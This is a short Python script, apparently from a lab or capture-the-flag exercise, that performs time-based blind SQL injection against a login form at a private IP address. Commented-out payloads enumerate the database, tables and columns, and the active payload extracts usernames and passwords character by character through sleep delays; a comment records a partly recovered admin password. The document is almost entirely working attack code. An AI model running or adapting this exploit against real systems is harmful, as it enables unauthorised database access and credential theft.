import requests
import base64
import sys
import string
import hashlib
import io
import time

sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding='utf8')		#改变标准输出的默认编码,否则s.text不能输出
ss = ""
x = string.printable

url = "http://10.3.120.24/?c=UserLogin&f=login"


payload={
	"username":"",
	"password":"123"
}
#测试
# r=requests.post(url,data=payload)
# print(r.text)

for i in range(1,60):
    for j in x:
        #payload["username"]=("123'/**/and/**/1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%s,1))=%s)=1%23")%(str(i),ord(j))
        #payload["username"]=("a'/**/or/**/IF(substr(database(),{},1)='{}',sleep(5),1)#").format(str(i),str(j))
        #payload["username"]=("a'/**/or/**/IF((ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={}),sleep(5),0)#").format(str(i),ord(j))
        #table : user
        #payload["username"]=("a'/**/or/**/IF((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='user')),%s,1))=%s),sleep(5),0)#")%(str(i),ord(j))
        payload["username"]=("a'/**/or/**/IF((ascii(substr((select(group_concat(username,password))from(user)),%s,1))=%s),sleep(5),0)#")%(str(i),ord(j))
		# admin Admin@12999...
        #print(payload)
        try:
            r = requests.post(url=url,data=payload,timeout=3)
            print( r.text)
        except requests.exceptions.Timeout as e:
            ss += j
            print(ss)
            break
